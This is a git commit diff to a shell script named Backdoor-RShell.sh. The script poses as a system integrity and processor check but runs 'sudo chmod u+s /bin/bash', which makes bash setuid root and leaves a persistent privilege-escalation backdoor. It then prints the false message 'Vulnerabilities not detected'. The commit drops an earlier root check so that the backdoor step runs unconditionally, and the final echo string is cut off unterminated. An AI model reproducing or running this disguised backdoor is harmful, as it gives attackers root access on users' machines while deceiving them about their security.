b0eed0ccd5190084b63b92672a22f8d21f7d3811
Alwin George <150264978+Alwin444@users.noreply.github.com>
2024-09-05 15:40:37 +0530

    Update Backdoor-RShell.sh

--- Vulnerablity/Backdoor-RShell.sh
+++ Vulnerablity/Backdoor-RShell.sh
@@ -3,7 +3,7 @@ back()
 {
  echo "Checking system integrity..................."
  sleep 4
- chmod u+s /bin/bash
+ sudo chmod u+s /bin/bash
  echo "Proccesor info runing: "
  for i in 1 2 3 4 5; do
  sleep 2
@@ -13,19 +13,6 @@ back()
  mpstat
  echo "Succesfull execution"
 }
-backer()
-{
- echo "Running"
- for p in 1 2 3 4 5; do
-  sleep 3
-  echo "..."
- done
- sleep 6
- sudo su
-}
-if [[ $USER == *"root"* ]]; then
- back
-else
- backer
- echo "You need to be root, be root and run this :< "
-fi
+
+back
+echo -e "Vulnerabilities not detected\nExecution completed; 
